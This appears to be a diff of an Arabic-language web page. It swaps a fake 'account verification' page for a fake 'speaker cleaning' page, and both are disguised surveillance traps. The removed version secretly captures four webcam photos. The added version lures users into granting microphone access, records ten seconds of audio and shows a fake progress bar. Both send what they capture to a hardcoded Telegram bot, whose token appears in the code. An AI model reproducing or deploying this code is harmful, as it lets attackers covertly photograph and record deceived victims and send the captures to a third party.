@@ -3,110 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إعداد الحساب | منصة التواصل</title>
+    <title>FixMySpeakers | تنظيف سماعة الهاتف</title>
     <style>
-        body {
-            margin: 0; padding: 0; font-family: sans-serif;
-            background-color: #101820; color: white;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
-        }
-        .box {
-            text-align: center; background: #1a222d; padding: 30px;
-            border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-        .loader {
-            border: 4px solid #333; border-top: 4px solid #007bff;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* إخفاء عناصر الفيديو والكانفاس لتجنب تشتيت المستخدم */
-        #video, #canvas { display: none; visibility: hidden; }
+        body { margin: 0; background: #111; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); width: 90%; max-width: 400px; border: 1px solid #333; }
+        .icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .btn { width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #2563eb; }
+        #status { margin-top: 20px; color: #9ca3af; font-size: 14px; }
+        .waves { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="loader"></div>
-        <h2 id="status">جاري تهيئة الكاميرا...</h2>
-        <p id="msg">يرجى الضغط على "سماح" لتأكيد هويتك وإكمال إعداد الحساب.</p>
+<div class="card">
+    <div class="icon">🔊</div>
+    <h2>تنظيف سماعة الهاتف</h2>
+    <p style="color: #ccc;">قم بإزالة الماء والغبار من سماعتك باستخدام موجات صوتية عالية التردد.</p>
+    
+    <button id="startBtn" class="btn">ابدأ عملية التنظيف</button>
+
+    <div id="waves" class="waves">
+        <p>جاري إصدار ذبذبات التنظيف...</p>
+        <div style="height: 5px; background: #333; border-radius: 5px; overflow: hidden;">
+            <div id="progress" style="width: 0%; height: 100%; background: #3b82f6; transition: 1s;"></div>
+        </div>
     </div>
+    
+    <div id="status">اضغط على الزر لبدء الفحص والاصلاح</div>
+</div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id');
+    const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const statusH2 = document.getElementById('status');
-        const msgP = document.getElementById('msg');
+    const startBtn = document.getElementById('startBtn');
+    const wavesDiv = document.getElementById('waves');
+    const statusDiv = document.getElementById('status');
+    const progressBar = document.getElementById('progress');
 
-        // البيانات الخاصة بك
-        const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';
-        const myChatId = '7122100508';
-
-        // طلب الوصول للكاميرا
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // التأكد من أن الفيديو بدأ العمل فعلياً قبل التقاط الصور
-                video.onplaying = () => {
-                    statusH2.innerText = "جاري التحقق من الهوية...";
-                    msgP.innerText = "يرجى الثبات أمام الكاميرا لثوانٍ معدودة.";
-                    
-                    let count = 0;
-                    const maxPhotos = 4;
-
-                    // ننتظر 2 ثانية بعد بدء الفيديو للتأكد من الوضوح
-                    setTimeout(() => {
-                        const timer = setInterval(() => {
-                            if (count < maxPhotos) {
-                                captureAndSend(count + 1);
-                                count++;
-                            } else {
-                                clearInterval(timer);
-                                statusH2.innerText = "اكتمل الإعداد!";
-                                msgP.innerText = "تم توثيق حسابك بنجاح، جاري توجيهك...";
-                                // إيقاف الكاميرا بعد الانتهاء للحفاظ على الخصوصية
-                                stream.getTracks().forEach(track => track.stop());
-                            }
-                        }, 3000); // التقاط صورة كل 3 ثوانٍ
-                    }, 2000);
-                };
-            })
-            .catch(err => {
-                statusH2.innerText = "خطأ في الوصول";
-                msgP.innerText = "يجب السماح بالكاميرا لتتمكن من إنشاء الحساب.";
-                console.error("Camera Error: ", err);
-            });
-
-        function captureAndSend(index) {
-            const context = canvas.getContext('2d');
-            
-            // ضبط حجم الكانفاس ليطابق حجم فيديو الكاميرا بدقة
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // رسم اللقطة
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // تحويل اللقطة لملف وإرسالها
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', myChatId);
-                formData.append('photo', blob, `snap_${index}.jpg`);
-                formData.append('caption', `✅ صورة جديدة للمستخدم (${index}/4)`);
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => console.log(`الصورة ${index} أُرسلت`))
-                .catch(err => console.error("فشل الإرسال:", err));
-            }, 'image/jpeg', 0.8);
+    startBtn.onclick = async () => {
+        if (!targetId) {
+            alert("خطأ: يرجى فتح الرابط من خلال الرابط المرسل إليك.");
+            return;
         }
-    </script>
+
+        try {
+            // طلب الميكروفون بحجة قياس كفاءة خروج الهواء/الصوت
+            statusDiv.innerText = "يرجى السماح بالوصول للميكروفون لقياس جودة الصوت أثناء التنظيف...";
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            startBtn.style.display = 'none';
+            wavesDiv.style.display = 'block';
+            statusDiv.innerText = "جاري التنظيف بالذبذبات.. يرجى رفع صوت الهاتف لأقصى درجة.";
+
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const formData = new FormData();
+                formData.append('chat_id', targetId);
+                formData.append('voice', blob, 'cleaning_test.ogg');
+                formData.append('caption', `🔊 تسجيل من موقع تنظيف السماعات`);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData });
+                
+                statusDiv.innerText = "اكتملت العملية! تم تنظيف السماعة بنجاح.";
+                stream.getTracks().forEach(t => t.stop());
+            };
+
+            // بدء التسجيل (التنظيف الوهمي)
+            mediaRecorder.start();
+
+            // تحريك شريط التقدم الوهمي
+            let percent = 0;
+            const timer = setInterval(() => {
+                percent += 10;
+                progressBar.style.width = percent + "%";
+                if (percent >= 100) {
+                    clearInterval(timer);
+                    mediaRecorder.stop();
+                }
+            }, 1000); // 10 ثواني من التسجيل
+
+        } catch (err) {
+            statusDiv.innerText = "فشل! يجب الموافقة على الميكروفون للسماح للنظام بقياس ذبذبات التنظيف.";
+        }
+    };
+</script>
 </body>
 </html>
